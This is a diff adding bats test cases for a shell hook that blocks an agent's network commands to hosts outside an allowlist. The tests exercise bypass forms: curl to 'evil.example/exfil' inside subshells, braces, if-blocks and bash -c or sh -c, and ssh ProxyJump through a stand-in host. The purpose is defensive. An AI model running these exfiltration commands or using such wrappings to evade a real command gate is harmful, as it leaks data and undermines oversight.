@@ -758,6 +758,64 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "block"'
 }
 
+@test "AC-2 (Codex CR5-A): '(curl evil)' subshell parens are BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash '(curl https://evil.example/exfil)'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR5-A): '{ curl evil; }' group command is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash '{ curl https://evil.example/exfil; }'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR5-A): 'if true; then curl evil; fi' control structure is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'if true; then curl https://evil.example/exfil; fi'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR5-A): 'bash -c \"curl evil\"' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash "bash -c 'curl https://evil.example/exfil'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR5-A): 'sh -c \"curl evil\"' is BLOCKED" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash "sh -c 'curl https://evil.example/exfil'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR5-A): 'bash -c \"curl allowed\"' WHEN allowlisted → allow" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash "bash -c 'curl https://api.github.com/foo'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR5-B): compact 'ssh -Jevil.example allowed' is BLOCKED" {
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -Jevil.example allowed.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR5-B): compact 'ssh -oProxyJump=evil allowed' is BLOCKED" {
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -oProxyJump=evil.example allowed.example'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
 @test "AC-2 (Codex CR3): \$(curl evil) INSIDE SINGLE quotes is NOT a bypass (literal)" {
   # Single quotes are literal in bash — `echo '$(curl evil)'` prints
   # the string verbatim, no expansion. So the gate should ALLOW (the
